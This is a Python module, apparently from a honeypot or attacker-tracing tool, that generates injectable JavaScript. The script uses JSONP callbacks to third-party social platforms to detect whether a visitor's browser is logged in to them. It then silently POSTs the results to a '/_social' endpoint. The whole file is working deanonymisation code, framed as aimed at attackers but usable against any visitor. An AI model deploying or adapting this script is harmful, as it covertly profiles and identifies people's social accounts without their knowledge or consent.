from modules.base import BaseModule


class SocialProbeModule(BaseModule):
    """社交账号探测模块：通过JSONP探测攻击者浏览器是否登录社交平台"""
    
    def get_probe_script(self):
        """返回社交账号探测的JS脚本"""
        targets = self.config.get('social_probe', {}).get('targets', [])
        if not targets:
            return ''
        
        target_js = []
        for t in targets:
            target_js.append(f'{{name:"{t["name"]}",url:"{t["url"]}"}}')
        target_list = ',\n'.join(target_js)
        
        return f'''<script>
(function() {{
    if (window.__scallop_social_done) return;
    window.__scallop_social_done = true;
    var targets = [{target_list}];
    var results = {{}};
    var timeout = 2000;
    var domain = window.location.origin;
    function probe(target) {{
        return new Promise(function(resolve) {{
            var cbName = '__scallop_cb_' + Date.now() + '_' + Math.random().toString(36).slice(2);
            var called = false;
            window[cbName] = function(data) {{
                called = true;
                results[target.name] = true;
                resolve(true);
                delete window[cbName];
            }};
            var script = document.createElement('script');
            script.src = target.url.replace('__scallop_probe', cbName);
            script.onerror = function() {{
                if (!called) results[target.name] = false;
                resolve(false);
                delete window[cbName];
                document.head.removeChild(script);
            }};
            script.onload = function() {{
                if (!called) results[target.name] = false;
                resolve(called);
                document.head.removeChild(script);
            }};
            document.head.appendChild(script);
            setTimeout(function() {{
                if (!called) {{
                    results[target.name] = false;
                    resolve(false);
                }}
            }}, timeout);
        }});
    }}
    var probes = targets.map(function(t) {{ return probe(t); }});
    Promise.allSettled(probes).then(function() {{
        try {{
            var xhr = new XMLHttpRequest();
            xhr.open('POST', domain + '/_social', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(results));
        }} catch(e) {{}}
    }});
}})();
</script>'''
    
    def get_probe_url(self):
        """返回社交探测的API路径"""
        return '/_social'
